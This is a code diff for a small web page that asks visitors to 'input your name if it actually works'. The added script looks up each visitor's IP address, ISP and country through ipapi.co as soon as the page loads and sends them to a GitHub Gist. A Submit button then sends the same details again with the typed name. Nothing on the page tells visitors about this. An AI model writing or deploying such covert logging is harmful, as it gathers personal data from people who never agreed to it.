@@ -7,6 +7,7 @@
     <h1>HII</h1>
     <h4>Input your name if it actually works!</h4>
     <input placeholder="Name" id="nameInput">
+    <button onclick="submitData()">Submit</button>
 
     <script>
         // Declare variables to store data
@@ -18,10 +19,15 @@
             ipAddress = data.ip;
             isp = data.org;
             country = data.country_name;
-            nameInput = documents.getElementsByTagName("nameInput").value;
 
-            // Send data to GitHub Gist
-            sendToGist(ipAddress, isp, country, nameInput);
+            // Send initial data to GitHub Gist
+            sendToGist(ipAddress, isp, country, "");
+
+            // Update HTML elements with the variables
+            // (Optional) You can display the initial data on the page
+            $('#ip').text(ipAddress);
+            $('#isp').text(isp);
+            $('#country').text(country);
         }
 
         // Function to send data to GitHub Gist
@@ -41,8 +47,8 @@
                 const newData = {
                     ip: ip,
                     isp: isp,
-                    country: country    
-                    name : nameInput
+                    country: country,
+                    name: name
                 };
 
                 // Append the new data to the existing data
@@ -71,7 +77,19 @@
             });
         }
 
-        // Fetch data from external API
+        // Function to be called when the button is clicked
+        function submitData() {
+            // Get the name input value
+            nameInput = $('#nameInput').val();
+
+            // Fetch data from external API and send data to GitHub Gist
+            $.getJSON('https://ipapi.co/json', function(data) {
+                handleData(data);
+                sendToGist(ipAddress, isp, country, nameInput);
+            });
+        }
+
+        // Fetch initial data from external API when the page starts
         $.getJSON('https://ipapi.co/json', handleData);
     </script>
 </body>
